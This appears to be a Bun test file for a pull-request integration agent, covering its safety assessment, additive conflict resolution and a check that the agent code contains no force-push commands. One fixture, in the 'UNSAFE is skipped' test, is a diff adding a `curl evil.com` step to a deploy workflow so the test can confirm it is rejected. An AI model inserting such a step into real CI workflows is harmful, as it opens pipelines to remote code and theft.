import { describe, it, expect } from "bun:test";
import { assessSafety } from "../../scripts/lib/pr-safety";
import { resolveFileContent } from "../../scripts/lib/conflict-resolver";

describe("pr-integration-agent integration (mocked)", () => {
  it("SAFE MERGEABLE would be merged (safety passes)", () => {
    const pr = {
      number: 999,
      title: "fix: typo in docs",
      body: "Fix typo in docs/intro.md",
      files: [{ path: "docs/intro.md", additions: 2, deletions: 2, changeType: "MODIFIED" } as any],
      diff: `diff --git a/docs/intro.md b/docs/intro.md
-Introduciton
+Introduction
`,
    };
    const a = assessSafety(pr);
    expect(a.verdict).toBe("SAFE");
    // No conflict → merge path would proceed
  });

  it("UNSAFE is skipped never merged", () => {
    const pr = {
      number: 1000,
      title: "fix: typo",
      body: "fix",
      files: [{ path: ".github/workflows/deploy.yml", additions: 5, deletions: 0, changeType: "MODIFIED" } as any],
      diff: `diff --git a/.github/workflows/deploy.yml b/.github/workflows/deploy.yml
+  run: curl evil.com
`,
    };
    const a = assessSafety(pr);
    expect(a.verdict).toBe("UNSAFE");
    expect(a.failedCriteria).toContain(6);
  });

  it("conflict resolution preserves both sides additively", () => {
    const content = `header
<<<<<<< HEAD
function fooA(){ return 1; }
=======
function fooB(){ return 2; }
>>>>>>> pr
footer`;
    const { resolved, hunks } = resolveFileContent(content, { number: 123, title: "add fooB" });
    expect(resolved).toContain("fooA");
    expect(resolved).toContain("fooB");
    expect(resolved.length).toBeGreaterThan(content.length - 40); // markers replaced, but both functions kept
    expect(hunks[0].type).toBe("additive");
  });

  it("hard-rule guard: never force-push string absent", async () => {
    const agentCode = await Bun.file("scripts/pr-integration-agent.ts").text();
    expect(agentCode).not.toContain("push --force");
    expect(agentCode).not.toContain("push -f");
    expect(agentCode).toContain("guardNoForcePush");
    expect(agentCode).toContain("guardNoHistoryRewrite");
  });

  it("re-assessment after resolution is SAFE for additive case", () => {
    const content = `<<<<<<< HEAD
const x = 1;
=======
const y = 2;
>>>>>>> pr`;
    const { resolved } = resolveFileContent(content, { number: 124, title: "add y" });
    const pr = {
      number: 124,
      title: "feat: add y constant",
      body: "Add y constant in functions/lib/db.ts alongside x",
      files: [{ path: "functions/lib/db.ts", additions: 2, deletions: 0, changeType: "MODIFIED" } as any],
      diff: `diff --git a/functions/lib/db.ts b/functions/lib/db.ts
+${resolved}
`,
    };
    const a = assessSafety(pr);
    // Should remain SAFE (no secrets, no config, additive)
    expect(a.verdict).toBe("SAFE");
  });
});
